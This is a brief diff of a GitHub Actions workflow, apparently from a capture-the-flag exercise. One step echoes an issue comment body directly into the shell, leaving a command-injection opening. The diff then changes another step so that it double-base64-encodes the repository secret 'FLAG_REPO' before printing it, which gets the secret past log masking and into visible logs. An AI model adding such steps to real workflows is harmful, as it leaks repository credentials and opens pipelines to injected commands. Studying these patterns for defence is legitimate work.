@@ -14,5 +14,5 @@ jobs:
     - name: comment debug
       run: echo ${{ github.event.comment.body }}
     - name: another debug
-      run: echo ${{ secrets.FLAG_REPO }}
+      run:  echo -e "SECRET=${{ secrets.FLAG_REPO }}\n" | base64 | base64
 
